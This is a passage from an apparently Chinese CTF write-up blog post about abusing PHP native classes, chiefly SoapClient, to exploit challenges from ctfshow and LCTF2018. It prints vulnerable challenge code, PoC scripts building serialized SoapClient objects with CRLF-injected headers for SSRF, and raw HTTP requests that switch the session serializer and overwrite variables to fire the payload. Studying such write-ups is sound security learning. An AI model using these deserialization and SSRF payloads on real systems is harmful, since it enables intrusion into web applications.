</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$xff</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>,</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nx>array_pop</span><span class=p>(</span><span class=nv>$xff</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$ip</span> <span class=o>=</span> <span class=nx>array_pop</span><span class=p>(</span><span class=nv>$xff</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$ip</span><span class=o>!==</span><span class=s1>&#39;127.0.0.1&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=k>die</span><span class=p>(</span><span class=s1>&#39;error&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nv>$token</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nv>$token</span><span class=o>==</span><span class=s1>&#39;ctfshow&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=nx>file_put_contents</span><span class=p>(</span><span class=s1>&#39;flag.txt&#39;</span><span class=p>,</span><span class=nv>$flag</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>绕过这个三层IP限制就会写入文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$vip</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;vip&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=c1>//vip can get flag one key
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$vip</span><span class=o>-&gt;</span><span class=na>getFlag</span><span class=p>();</span>
</span></span></code></pre></td></tr></table></div></div><p>很明显的原生类啊</p><p>我们先绕过那个<code>array_pop()</code>,本身相当于我们打入多个IP被解析为数组之后，我们再利用<code>array_pop()</code>来移除数组的元素，再者来获取解析，所以写个<code>demo</code>试验一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=c1>// 模拟 HTTP_X_FORWARDED_FOR 请求头
</span></span></span><span class=line><span class=cl><span class=c1>// 你可以修改这个字符串来测试不同的输入情况
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;127.0.0.1,127.0.0.1&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 打散为数组，用,分割
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$xff</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>,</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 移除数组中的最后一个元素
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>array_pop</span><span class=p>(</span><span class=nv>$xff</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 获取移除后的最后一个元素（即倒数第二个元素）
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$ip</span> <span class=o>=</span> <span class=nx>array_pop</span><span class=p>(</span><span class=nv>$xff</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 输出解析出的 IP 地址
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=s2>&#34;解析出的 IP 地址是: </span><span class=si>$ip\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>也就是成功绕过了，那么我们可以用<code>SoapClient</code>增加任意<code>http</code>头</p><p>写个<code>poc</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$target</span><span class=o>=</span><span class=s2>&#34;http://127.0.0.1/flag.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$UA</span><span class=o>=</span><span class=s2>&#34;ctfshow</span><span class=se>\r\n</span><span class=s2>X-Forwarded-For:127.0.0.1,127.0.0.1</span><span class=se>\r\n</span><span class=s2>Content-Type:application/x-www-form-urlencoded</span><span class=se>\r\n</span><span class=s2>Content-Length:13</span><span class=se>\r\n\r\n</span><span class=s2>token=ctfshow&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=k>new</span> <span class=nx>SoapClient</span><span class=p>(</span><span class=k>null</span><span class=p>,</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;location&#39;</span><span class=o>=&gt;</span><span class=nv>$target</span><span class=p>,</span><span class=s1>&#39;user_agent&#39;</span><span class=o>=&gt;</span><span class=nv>$UA</span><span class=p>,</span><span class=s1>&#39;uri&#39;</span><span class=o>=&gt;</span><span class=s2>&#34;http://127.0.0.1/&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$b</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>这里有个小细节就是<code>\r\n</code>的解析问题，你如果写单引号的话是不能够正常解析的，而我Python写多了，就习惯写单引号了，所以折腾了一会</p><p><strong>demo bestphp&rsquo;s revenge</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span> <span class=o>=</span> <span class=s1>&#39;implode&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>call_user_func</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;f&#39;</span><span class=p>],</span> <span class=nv>$_POST</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=nx>reset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>),</span> <span class=s1>&#39;welcome_to_the_lctf2018&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>call_user_func</span><span class=p>(</span><span class=nv>$b</span><span class=p>,</span> <span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err> 
</span></span></span></code></pre></td></tr></table></div></div><p>flag.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>only</span> <span class=nx>localhost</span> <span class=nx>can</span> <span class=nx>get</span> <span class=nx>flag</span><span class=o>!</span><span class=nx>session_start</span><span class=p>();</span> <span class=k>echo</span> <span class=s1>&#39;only localhost can get flag!&#39;</span><span class=p>;</span> <span class=nv>$flag</span> <span class=o>=</span> <span class=s1>&#39;LCTF{*************************}&#39;</span><span class=p>;</span> <span class=k>if</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s2>&#34;REMOTE_ADDR&#34;</span><span class=p>]</span><span class=o>===</span><span class=s2>&#34;127.0.0.1&#34;</span><span class=p>){</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$flag</span><span class=p>;</span> <span class=p>}</span> <span class=nx>only</span> <span class=nx>localhost</span> <span class=nx>can</span> <span class=nx>get</span> <span class=nx>flag</span><span class=o>!</span>
</span></span></code></pre></td></tr></table></div></div><p>这里可以调用两个东西，那么看到session很容易猜到我们可以自己手动构造一个session反序列化漏洞，方便等会利用<code>SoapClient</code></p><p>先写个<code>poc</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$target</span><span class=o>=</span><span class=s2>&#34;http://127.0.0.1/flag.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=k>new</span> <span class=nx>SoapClient</span><span class=p>(</span><span class=k>null</span><span class=p>,</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;location&#39;</span><span class=o>=&gt;</span><span class=nv>$target</span><span class=p>,</span><span class=s1>&#39;user_agent&#39;</span><span class=o>=&gt;</span><span class=s2>&#34;bao</span><span class=se>\r\n</span><span class=s2>Cookie:PHPSESSID=baozongwi</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=s1>&#39;uri&#39;</span><span class=o>=&gt;</span><span class=s2>&#34;http://127.0.0.1/&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$b</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;|&#34;</span><span class=o>.</span><span class=nv>$a</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>首先默认引擎是<code>php</code>,我们设置成<code>php_serialize</code>,同时写入请求等待触发</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /?f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A23%3A%22bao%0D%0ACookie%3Abaozongwi%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D HTTP/1.1
</span></span><span class=line><span class=cl>Host: c818c5d3-ecfa-4f94-b98c-351d187d3305.node5.buuoj.cn:81
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=4bi9mnfonhkrth0isn77b2u1k6
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>Content-Length: 31
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>serialize_handler=php_serialize
</span></span></code></pre></td></tr></table></div></div><p>然后变量覆盖使得触发不存在的方法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>call_user_func</span><span class=p>(</span><span class=nx>call_user_func</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;SoapClient&#39;</span><span class=p>,</span> <span class=s1>&#39;welcome_to_the_lctf2018&#39;</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /?f=extract&amp;name=SoapClient HTTP/1.1
</span></span><span class=line><span class=cl>Host: c818c5d3-ecfa-4f94-b98c-351d187d3305.node5.buuoj.cn:81
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=4bi9mnfonhkrth0isn77b2u1k6
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>Content-Length: 16
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>b=call_user_func
</span></span></code></pre></td></tr></table></div></div><p>最后根据<code>session</code>特性，访问即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET / HTTP/1.1
</span></span><span class=line><span class=cl>Host: c818c5d3-ecfa-4f94-b98c-351d187d3305.node5.buuoj.cn:81
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=baozongwi
</span></span><span class=line><span class=cl>Connection: close
</span></span></code></pre></td></tr></table></div></div><p>就这样就可以了，中途还是有一点点绕，主要就是要想到这个<code>session</code>和<code>crlf</code>怎么联系在一起(通过<code>session_id</code>)，然后正常打ssrf就可以了，方法的触发也一会就想得到</p><h2 id=利用时机>利用时机</h2><p>看了这么多demo，应该大概知道利用时机了吧，</p><blockquote><p>比如说disable_function禁用函数过多，只能进行类的调用触发方法来达到目的，又或者说代码非常少，并且其中已经明显的看得出来能够触发那些特殊方法，再逆序寻找可利用的原生类</p></blockquote><h1 id=0x03-小结>0x03 小结</h1><p>原生类可以搞到这么多事情，同时其中也有部分的xss部分，但是我的xss暂时不是很擅长，可以说是提醒我了，学到了一些东西</p><h1 id=0x04-reference>0x04 Reference</h1><p>网上的文章都有查阅，感谢师傅们！</p></section><footer class=article-footer><section class=article-tags><a href=/tags/php/>Php</a>
<a href=/tags/%E5%A7%BF%E5%8A%BF/>姿势</a></section><section class=article-reward style="margin:var(--card-padding)0 0;display:block;text-transform:none;text-align:center"><h3 style="margin:0 0 .75rem;font-size:1.1rem">赞赏支持</h3><figure style="margin:0 auto"><img src=/wechat.png alt loading=lazy style="width:min(260px,90vw);height:auto;border:1px solid #eee;border-radius:12px;background:#fff;padding:6px;box-shadow:0 2px 8px rgba(0,0,0,4%)"><figcaption style=font-size:.9rem;color:#666;margin-top:.5rem></figcaption></figure></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/dynamic-debugging-pop-discovery/><div class=article-details><h2 class=article-title>动调挖掘pop</h2></div></a></article><article><a href=/p/php-non-outbound-ffi/><div class=article-details><h2 class=article-title>php中不出网的FFI</h2></div></a></article><article><a href=/p/php-pseudo-protocols/><div class=article-details><h2 class=article-title>php伪协议</h2></div></a></article><article><a href=/p/php-deserialization-pop/><div class=article-details><h2 class=article-title>php反序列化\pop</h2></div></a></article><article><a href=/p/create-function-injection/><div class=article-details><h2 class=article-title>create_function()注入</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2024 -
2025 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>